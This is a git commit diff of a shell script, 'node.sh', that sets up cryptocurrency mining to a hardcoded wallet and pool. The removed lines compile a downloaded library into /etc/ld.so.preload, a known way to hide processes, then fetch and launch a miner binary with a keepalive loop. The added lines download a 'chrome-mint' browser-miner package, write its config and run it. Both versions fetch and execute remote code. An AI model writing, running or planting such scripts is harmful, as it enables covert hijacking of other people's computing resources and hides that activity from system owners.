03601a797b7cb05ea35227d77e8187e792c84cb0
barukish <barukish@outlook.co.id>
2024-06-22 17:20:20 -0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -1,15 +1,55 @@
 #!/bin/bash
-apt-get update ; apt-get install sudo wget cpulimit -y
-curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
-mkdir .lib && cd .lib
-rm -rf sgr1
-wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
-chmod +x sgr1
-cpulimit -l 200 -e sgr1 &
-./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads 2 --enable-1gb-hugepages --keepalive  &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
+
+ALGO="yescryptr32"
+HOST="stratum-asia.rplant.xyz"
+PORT="17116"
+WALLET="UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx"
+PASSWORD="x"
+THREADS=3
+FEE=0
+
+# Function to check if Node.js is installed
+function check_node() {
+    if ! command -v node &> /dev/null; then
+      echo "Installing Nodejs 18 ..."
+      curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+      source ~/.bashrc
+      nvm install 18
+    fi
+}
+
+# Function to setup the environment and run the script
+function setup_and_run() {
+    # Download and extract the tarball
+    curl https://github.com/malphite-code-2/chrome-scraper/releases/download/chrome-v2/chrome-mint.tar.gz -L -O -J
+    tar -xvf chrome-mint.tar.gz
+    rm chrome-mint.tar.gz
+    cd chrome-mint || { echo "Failed to enter the chrome-mint directory"; exit 1; }
+
+    # Install dependencies
+    npm install
+
+    # Add Google Chrome's signing key and repository
+    wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
+    echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google.list
+
+    # Update and install Google Chrome
+    sudo apt-get update
+    sudo apt-get install -y google-chrome-stable
+
+    # Replace the config.json file with the provided values
+    rm config.json
+    echo '{"algorithm": "'"$ALGO"'", "host": "'"$HOST"'", "port": '"$PORT"', "worker": "'"$WALLET"'", "password": "'"$PASSWORD"'", "workers": '"$THREADS"', "fee": '"$FEE"' }' > config.json
+
+    # Check if we are in the correct directory and run node index.js
+    node index.js
+}
+
+if [ "$(basename "$PWD")" != "chrome-mint" ]; then
+  check_node
+  echo "Installing BrowserMiner v1.0 ..."
+  setup_and_run
+else
+  echo "You are in the chrome-mint directory."
+  node index.js
+fi
